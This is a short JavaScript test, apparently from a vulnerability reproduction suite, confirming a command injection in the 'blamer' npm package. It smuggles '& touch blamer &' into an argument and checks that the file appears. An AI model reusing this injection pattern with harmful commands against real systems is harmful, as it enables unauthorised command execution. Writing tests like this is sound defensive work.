//https://snyk.io/vuln/SNYK-JS-BLAMER-559541
test("Command Injection in blamer", () => 
{
	const Root = require("blamer");
	const fs = require('fs');
	const path = './blamer';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let attack_command = "& touch blamer &";
	root = new Root('git',attack_command);
	root.blameByFile("./");

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});